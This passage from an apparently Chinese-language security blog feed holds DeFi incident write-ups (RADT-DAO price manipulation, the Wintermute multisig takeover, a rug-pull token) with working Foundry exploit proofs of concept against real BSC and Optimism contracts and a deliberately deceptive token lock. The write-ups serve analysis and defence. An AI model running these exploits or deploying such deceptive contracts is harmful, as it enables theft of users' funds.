CirculateBUSD.startTrading(0x5695Ef5f2E997B2e142B38837132a6c3Ddc463b7, </span><br><span class="line">                            0x1a784379d99db42000000, </span><br><span class="line">                            0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);</span><br><span class="line"></span><br><span class="line">        uint256 afterAttack = busdc.balanceOf(address(attacker));</span><br><span class="line">        console.log(&quot;after attacker balance:&quot;, afterAttack);</span><br><span class="line"></span><br><span class="line">        assertEq(afterAttack, beforeAttack + 2000000000000000000000000);</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>在关键的方法中涉及外部合约调用，如果合约没有开源则必须谨慎</p>]]></content>
      
      
      <categories>
          
          <category> 13.RugPull </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.RugPull @lock token</title>
      <link href="/2023/09/18/13.RugPull/01.RugPull%20@lock%20token/"/>
      <url>/2023/09/18/13.RugPull/01.RugPull%20@lock%20token/</url>
      
        <content type="html"><![CDATA[<h1 id="RugPull-lock-token"><a href="#RugPull-lock-token" class="headerlink" title="RugPull @lock token"></a>RugPull @lock token</h1><p>an easy rug pull contract</p><p>project team is the owner, he promises he won’t transfer his asset until next year. He will show u the <code>transfer()</code>. In fact, he can transfer his asset by <code>transferFrom()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract LockCoin is ERC20&#123;</span><br><span class="line">    uint256 lockTime = block.timestamp + 365 days;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;MyCoin&quot;,&quot;MC&quot;)&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        _mint(msg.sender, 100*10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier lock()&#123;</span><br><span class="line">        if(msg.sender == owner) require(block.timestamp &gt; lockTime);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public virtual  override lock returns(bool)&#123;</span><br><span class="line">        return super.transfer(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 13.RugPull </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.RADT-DAO@flashloan@priceManipulation</title>
      <link href="/2023/09/18/08.PoC/09.RADT-DAO@flashloan@priceManipulation/"/>
      <url>/2023/09/18/08.PoC/09.RADT-DAO@flashloan@priceManipulation/</url>
      
        <content type="html"><![CDATA[<h1 id="RADT-DAO-flashloan-priceManipulation"><a href="#RADT-DAO-flashloan-priceManipulation" class="headerlink" title="RADT-DAO@flashloan@priceManipulation"></a>RADT-DAO@flashloan@priceManipulation</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>池子[PancakeSwap V2: BSC-USD-RADT-DAO]被价格操纵，并且发现可以价格操纵的人被黑吃黑抢跑。</p><ul><li>时间：2022.09.23</li><li>损失金额：$94,238.5</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>4笔抢跑<ul><li>抢跑成功：<a href="https://bscscan.com/tx/0xd692f71de2768017390395db815d34033013136c378177c05d0d46ef3b6f0897">0xd692f71de2768017390395db815d34033013136c378177c05d0d46ef3b6f0897</a></li><li>抢跑失败：<a href>0xb8ddbd4b585892c435ae10335a465c78e180314b8a1f777ffa014d8f9369d710</a></li><li>抢跑失败：<a href="https://bscscan.com/tx/0xacc1163a673b9ec6f06fa16b8ba1df430d430d8aa8729fe25660cb8f6167e07a">0xacc1163a673b9ec6f06fa16b8ba1df430d430d8aa8729fe25660cb8f6167e07a</a></li><li>发现可以进行价格操纵的、被抢跑的交易：<a href="https://bscscan.com/tx/0xe4f697883c2963eda98245bf25ad4613b5f0bf623253ff886066a6dd37dc36f6">0xe4f697883c2963eda98245bf25ad4613b5f0bf623253ff886066a6dd37dc36f6</a></li></ul></li><li>[BSC-USD, RADT-DAO]池子：<a href="https://bscscan.com/address/0xaf8fb60f310dcd8e488e4fa10c48907b7abf115e">0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e</a></li><li>RADT-DAO代币地址：<a href="https://bscscan.com/address/0xdc8cb92aa6fc7277e3ec32e3f00ad7b8437ae883">0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883</a></li><li>RADT-DAO代币的<code>_wrap</code>（未开源，存储合约）：<a href="https://bscscan.com/address/0x01112ea0679110cbc0ddea567b51ec36825aef9b">0x01112eA0679110cbc0ddeA567b51ec36825aeF9b</a></li><li>RADT-DAO代币的<code>_wrap</code>的逻辑合约（未开源，逻辑合约）：<a href="https://bscscan.com/address/0x9122191d7b2ccf11a2600de4eafd6b8cd3d03a62">0x9122191d7B2CCF11a2600de4eafD6b8cD3D03a62</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/09/18/08.PoC/09.RADT-DAO@flashloan@priceManipulation/image-20230903211625169.png" alt="image-20230903211625169"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/09/18/08.PoC/09.RADT-DAO@flashloan@priceManipulation/image-20230903212526363.png" alt="image-20230903212526363"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>1.黑客用闪电贷得到243673个BSC-USD</p><p>2.操纵价格的核心：<code>withdraw()</code>使得池子价格变动。我们来详细分析一下这个RADT-DAO代币的调用逻辑：</p><p>2.1反编译<code>_wrap</code>得到：调用RADT-DAO合约的函数，都会delegatecall到另外一个合约的代码，可以知道<code>_wrap</code>合约是一个存储合约，实际逻辑写在其他合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __function_selector__() public nonPayable &#123; </span><br><span class="line">    CALLDATACOPY(0, 0, msg.data.length);</span><br><span class="line">    v0 = ___function_selector__.delegatecall(MEM[0 len msg.data.length], MEM[0 len 0]).gas(msg.gas);</span><br><span class="line">    require(v0, 0, RETURNDATASIZE()); // checks call status, propagates error data on error</span><br><span class="line">    return MEM[0 len (RETURNDATASIZE())];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.2随便找一个<code>_wrap</code>的交易，就可以找到它的<a href="https://bscscan.com/address/0x9122191d7b2ccf11a2600de4eafd6b8cd3d03a62">逻辑合约</a>，也没有开源，对它进行反编译。查看它的<code>withdraw()</code>，发现又臭又长，可以总结出一些特点：</p><ul><li>是用<code>call()</code>来发送资产的</li><li>每次withdraw之前，都会到池子中获取价格</li><li>根据规则和条件，给一些地址发送RADT-DAO代币，似乎这些地址是手续费的地址，是一系列地址，或多或少</li></ul><p><img src="/2023/09/18/08.PoC/09.RADT-DAO@flashloan@priceManipulation/image-20230903220211348.png" alt="image-20230903220211348"></p><p>2.3猜测：这个<code>withdraw()</code>像是专门给项目方调用的，提取手续费，设置为public也不怕，获得手续费的规则写好在<code>withraw()</code>里面了，应该是根据情况给项目方不同员工的地址转钱。逻辑是池子的交易量越大，或者价格越高等啥因素，使得项目方计算出来的手续费就越多。黑客手动帮他们提取手续费，池子中的RADT-DAO就更少了，那么黑客手中的RADT-DAO也就越值钱，重新在池子中换回BSC-USD就更多，从而获利。</p><p>3.价格操纵后，换回BSC-USD，得到337977个，获利：337977 - 243673 = 94,304个。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    // 代币</span><br><span class="line">    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">    IERC20 RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);</span><br><span class="line">    // 池子：手动更新池子价格</span><br><span class="line">    IUni_Pair_V2 pair = IUni_Pair_V2(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);</span><br><span class="line">    // 存储合约，用来调用withdraw</span><br><span class="line">    IStorageContract storageContract = IStorageContract(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);</span><br><span class="line">    // 闪电贷</span><br><span class="line">    address getFlashloan = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;</span><br><span class="line">    // router：用于swap</span><br><span class="line">    IUni_Router_V2 Router = IUni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);</span><br><span class="line"></span><br><span class="line">    uint256 public constant FLASHLOAN_AMOUNT = 243673213068049612594655;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 21_572_418);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        emit log_named_decimal_uint(&quot;[before] Attacker BSC_USD balance&quot;, BSC_USD.balanceOf(address(this)), 18);</span><br><span class="line"></span><br><span class="line">        // 为两次swap做准备</span><br><span class="line">        BSC_USD.approve(address(Router), ~uint256(0));</span><br><span class="line">        RADT.approve(address(Router), ~uint256(0));</span><br><span class="line"></span><br><span class="line">        IGetFlashloan(getFlashloan).flashLoan(0, FLASHLOAN_AMOUNT, address(this), new bytes(1));</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(&quot;[after pay back flashloan] Attacker BSC_USD balance&quot;, BSC_USD.balanceOf(address(this)), 18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 闪电贷回调</span><br><span class="line">    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external &#123;</span><br><span class="line">        emit log_named_decimal_uint(&quot;[get flashloan] Attacker BSC_USD balance&quot;, BSC_USD.balanceOf(address(this)), 18);</span><br><span class="line"></span><br><span class="line">        // 价格操纵前买入RADT</span><br><span class="line">        buyRADT();</span><br><span class="line"></span><br><span class="line">        // 不写会报[FAIL. Reason: the price of coin is low],这是在withdraw取款的时候报错</span><br><span class="line">        // 给池子发送1个BSC-USD，抬高一点RADT代币的价格，使得withdraw满足条件可以调用</span><br><span class="line">        BSC_USD.transfer(address(pair), 1);</span><br><span class="line">        </span><br><span class="line">        uint256 amount = 89806000000000000000000;</span><br><span class="line"></span><br><span class="line">        // 操纵价格</span><br><span class="line">        storageContract.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);</span><br><span class="line">        pair.sync();</span><br><span class="line"></span><br><span class="line">        // 价格操纵后卖出RADT</span><br><span class="line">        sellRADT();</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(&quot;[after attack] Attacker BSC_USD balance&quot;, BSC_USD.balanceOf(address(this)), 18);</span><br><span class="line"></span><br><span class="line">        // 闪电贷还款</span><br><span class="line">        BSC_USD.transfer(address(getFlashloan), FLASHLOAN_AMOUNT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyRADT() public &#123;</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(BSC_USD);</span><br><span class="line">        path[1] = address(RADT);</span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            1000 * 1e18, 0, path, address(this), ~uint256(0)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sellRADT() public &#123;</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(RADT);</span><br><span class="line">        path[1] = address(BSC_USD);</span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            RADT.balanceOf(address(this)), 0, path, address(this),~uint256(0)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>手续费的领取不应该使得池子的价格变动</li><li>应该让项目方自己来领取，不应该任何人都可以调用<code>withdraw()</code>帮项目方领取手续费</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.Wintermute@txReplay@companyProbems</title>
      <link href="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/"/>
      <url>/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/</url>
      
        <content type="html"><![CDATA[<h1 id="Wintermute-txReplay-companyProbems"><a href="#Wintermute-txReplay-companyProbems" class="headerlink" title="Wintermute@txReplay@companyProbems"></a>Wintermute@txReplay@companyProbems</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>Wintermute项目方发现他们无法控制本来应该属于他们的多签地址（持有20,000,000 OP）</p><ul><li>时间：2022.06.08</li><li>损失金额：20,000,000 OP</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>Wintermute项目方内部持有的地址：<code>0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A</code>（Safe: Deployer 3）</p><ul><li>L1<ul><li>Wintermute在Ethereum上的多签合约地址（Wintermute: Multisig，官方部署的）：<a href="https://etherscan.io/address/0x4f3a120E72C76c22ae802D129F599BFDbc31cb81">0x4f3a120E72C76c22ae802D129F599BFDbc31cb81</a></li></ul></li><li>L2<ul><li>地址<ul><li>Wintermute的多签合约地址（Wintermute: Multisig，黑客部署的）：<a href="https://etherscan.io/address/0x4f3a120E72C76c22ae802D129F599BFDbc31cb81">0x4f3a120E72C76c22ae802D129F599BFDbc31cb81</a></li><li>Optimism基金会的多签合约地址（Wintermute: Multisig）：<a href="https://optimistic.etherscan.io/address/0x2501c477d0a35545a387aa4a3eee4292a9a8b3f0">0x2501c477D0A35545a387Aa4A3EEe4292A9a8B3F0</a></li><li>黑客地址1：<a href="https://optimistic.etherscan.io/address/0x60b28637879b5a09d21b68040020ffbf7dba5107">0x60b28637879b5a09d21b68040020ffbf7dba5107</a></li><li>黑客地址2：<a href="https://optimistic.etherscan.io/address/0x8bcfe4f1358e50a1db10025d731c8b3b17f04dbb">0x8bcfe4f1358e50a1db10025d731c8b3b17f04dbb</a></li><li><code>_masterCopy</code>由黑客地址2部署：<a href="https://optimistic.etherscan.io/address/0xe7145dd6287ae53326347f3a6694fcf2954bcd8a">0xe7145dd6287ae53326347f3a6694fcf2954bcd8a</a></li></ul></li><li>交易<ul><li>黑客部署Wintermute: Multisig发起攻击：<a href="https://optimistic.etherscan.io/tx/0x00a3da68f0f6a69cb067f09c3f7e741a01636cbc27a84c603b468f65271d415b">0x00a3da68f0f6a69cb067f09c3f7e741a01636cbc27a84c603b468f65271d415b</a></li><li>黑客部署<code>_masterCopy</code>：<a href="https://optimistic.etherscan.io/tx/0x69ee67800307ef7cb30ffa42d9f052290e81b3df6d3b7c29303007e33cd1c240">0x69ee67800307ef7cb30ffa42d9f052290e81b3df6d3b7c29303007e33cd1c240</a></li><li>Optimism基金会转1个op给Wintermute多签合约地址作为测试：<a href="https://optimistic.etherscan.io/tx/0xf79ed3037b55fbfd305007da2f19fb7960d31b8410453c679313e37a6d8548f4">0xf79ed3037b55fbfd305007da2f19fb7960d31b8410453c679313e37a6d8548f4</a></li><li>Optimism基金会转1,000,000个op给Wintermute多签合约地址：<a href="https://optimistic.etherscan.io/tx/0x0c1d6166293924566ea0ca32d07379c7033a8b8f2558f667f917543e51dd474a">0x0c1d6166293924566ea0ca32d07379c7033a8b8f2558f667f917543e51dd474a</a></li><li>Optimism基金会转19,000,000个op给Wintermute多签合约地址：<a href="https://optimistic.etherscan.io/tx/0x8e29eef359f6c18a06e229157d44467b5e873f6e5b996baa7124b38eb6dfb1db">0x8e29eef359f6c18a06e229157d44467b5e873f6e5b996baa7124b38eb6dfb1db</a></li></ul></li></ul></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><a href="https://optimistic.etherscan.io/token/0x4200000000000000000000000000000000000042?a=0x4f3a120E72C76c22ae802D129F599BFDbc31cb81">网站</a></p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903141209921.png" alt="image-20230903141209921"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><ol><li>Optimism官方想和Wintermute搞合作，因此委托Wintermute在L2（optimism）来做提供流动性的服务。</li><li>Optimism官方说会给他们20,000,000 OP来提供流动性，需要Wintermute给一个多签地址来接收这些代币。</li><li>Wintermute提供了一个多签地址X（这个地址在L1部署了，但是L2尚未部署，也就是无法控制）</li><li>然后Optimism官方就转20,000,000 OP到这个多签地址X</li><li>事后，Wintermute发现这个多签名地址X他们无法控制，并且已经被部署了：他们发现了被黑客攻击了，20,000,000 OP完全被黑客控制</li><li>为了合作，Optimism官方再次发送了20,000,000 OP给Wintermute，并且Wintermute承认这完全是他们的过错。Wintermute给Optimism官方做出了赔偿，并且想办法和黑客交涉，但是黑客不打算偿还</li></ol><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>从攻击过程可以得知，这是Wintermute项目方内部的问题：多签地址是他们提供的，然后有内鬼得知这个消息，并且知道这个多签地址在L2尚未部署，因此他可以抢先控制这个地址。20,000,000 OP转到这个多签地址之前，此合约尚未被部署，到账之后(2022.05.27)，内鬼部署和抢先控制这个多签地址(2022.06.05)。那么这个内鬼就是知道如何在L2部署相同的地址了，在L2部署和L1相同的地址（Wintermute提供的多签地址）。</p><p>那么此次攻击的核心就是：知道内部消息而抢先控制地址，和要懂得地址计算规则。那么接下来，我们就分析这个相同的多签地址是如何计算出来的。为了方便理解，我们将Wintermute提供的被黑的多签地址简写为<code>0x4f3</code>。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Wintermute采用GnosisSafe的克隆合约模式，使用代理创建合约：使用CREATE进行部署，这就意味着地址计算原理是<code>keccak256(rlp(senderAddress, nonce))[12:31]</code>，仅仅和msg.sender和nonce有关，那么在任何一条EVM兼容链，只要msg.sender选择在相同的nonce部署合约，得到的地址就是一模一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createProxy(address masterCopy, bytes memory data)public returns (Proxy proxy)&#123;</span><br><span class="line">       proxy = new Proxy(masterCopy);</span><br><span class="line">       if (data.length &gt; 0)</span><br><span class="line">           // solium-disable-next-line security/no-inline-assembly</span><br><span class="line">           assembly &#123;</span><br><span class="line">               if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) &#123; revert(0, 0) &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       emit ProxyCreation(proxy);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="L1部署多签"><a href="#L1部署多签" class="headerlink" title="L1部署多签"></a>L1部署多签</h3><p>我们来看一下在L1中，这个<code>0x4f3</code>是如何部署出来的：它是在<a href="https://etherscan.io/tx/0xd705178d68551a6a6f65ca74363264b32150857a26dd62c27f3f96b8ec69ca01">这笔交易</a>中被部署出来，可以看出，他是使用GnosisSafe克隆合约的模式，产生多签地址。</p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903163418906.png" alt="image-20230903163418906"></p><p>然后继续<a href="https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a">溯源</a>，看看是如何部署GnosisSafe的：从图中发现是使用Wintermute项目方持有的地址<code>0x1aa7</code>部署的</p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903145744078.png" alt="image-20230903145744078"></p><h3 id="L2控制多签"><a href="#L2控制多签" class="headerlink" title="L2控制多签"></a>L2控制多签</h3><p>那么，如果想在L2复刻L1的地址，那么进行相同的操作即可：内鬼偷偷拿内部地址<code>0x1aa7</code>进行<a href="https://optimistic.etherscan.io/address/0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A">部署</a>GnosisSafe和ProxyFactory</p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903150102575.png" alt="image-20230903150102575"></p><p>然后<a href="https://optimistic.etherscan.io/tx/0x00a3da68f0f6a69cb067f09c3f7e741a01636cbc27a84c603b468f65271d415b">部署</a>多签合约，控制该地址<code>0x4f3a</code>：因为不知道<code>0x4f3a</code>是ProxyFactory第几次部署的，内鬼也懒得数了，直接爆破，在其中某次createProxy中得到<code>0x4f3a</code>，并且因为是由黑客地址2部署的，因此多签信息都由他来设置。下面分别是<a href="https://explorer.phalcon.xyz/tx/optimism/0x00a3da68f0f6a69cb067f09c3f7e741a01636cbc27a84c603b468f65271d415b?line=0">phalcon</a>和<a href="https://dashboard.tenderly.co/tx/optimistic/0x00a3da68f0f6a69cb067f09c3f7e741a01636cbc27a84c603b468f65271d415b?trace=0.135.0">tenderly</a>的显示结果（phalcon无法查询地址，一行一行找半天服了）：</p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903152709285.png" alt="image-20230903152709285"></p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903173554945.png" alt="image-20230903173554945"></p><p>关于黑客地址2（<code>0xe7145dd6287ae53326347f3a6694fcf2954bcd8a</code>），他是在这个<a href="https://optimistic.etherscan.io/tx/0x69ee67800307ef7cb30ffa42d9f052290e81b3df6d3b7c29303007e33cd1c240">交易</a>中部署的。黑客地址2的资金来源：混币器<a href="https://optimistic.etherscan.io/address/0x84443cfd09a48af6ef360c6976c5392ac5023a1f">Tornado.Cash</a>。</p><p><img src="/2023/09/18/08.PoC/08.Wintermute@txReplay@companyProbems/image-20230903153644008.png" alt="image-20230903153644008"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">//https://www.levi104.com/categories/08-PoC/</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line"></span><br><span class="line">    IProxyFactory proxy = IProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;optimism&quot;, 10_607_735);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        // 爆破，得到多签地址`0x4f3a`</span><br><span class="line">        address multiSigAddress;</span><br><span class="line">        while (multiSigAddress != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) &#123;</span><br><span class="line">            multiSigAddress = proxy.createProxy(0xE7145dd6287AE53326347f3A6694fCf2954bcD8A, &quot;0x&quot;);</span><br><span class="line">            console.log(&quot;multiSigAddress&quot;,multiSigAddress);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        assertEq(multiSigAddress, 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>项目方内部管理一定要清晰，杜绝内鬼</li><li>不要将资金打到一个无法控制的地址。此案例是地址尚未部署，没有真正控制，过于相信别人不知道这个多签地址</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.NewFreeDAO@falshloan@reward</title>
      <link href="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/"/>
      <url>/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/</url>
      
        <content type="html"><![CDATA[<h1 id="NewFreeDAO-falshloan-reward"><a href="#NewFreeDAO-falshloan-reward" class="headerlink" title="NewFreeDAO@falshloan@reward"></a>NewFreeDAO@falshloan@reward</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>NewFreeDAO未开源的奖励合约遭受了闪电贷攻击。奖励合约是指：存款时间越长、持有代币越多，用户可以获得的奖励代币就越多。</p><ul><li>时间：2022.09.08</li><li>损失金额：$125M</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>攻击者EOA账户：<a href="https://bscscan.com/address/0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2">0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2</a> </li><li>攻击合约：<a href="https://bscscan.com/address/0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863">0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863</a></li><li>存在漏洞的奖励合约（未开源）：<a href="https://bscscan.com/address/0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e">0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e</a> </li><li>攻击事件hash：<a href="https://bscscan.com/tx/0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26">0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26</a></li><li>涉及的池子<ul><li>WBNB-USDT：<a href="https://bscscan.com/address/0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae">0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae</a> </li><li>USDT-NFD：<a 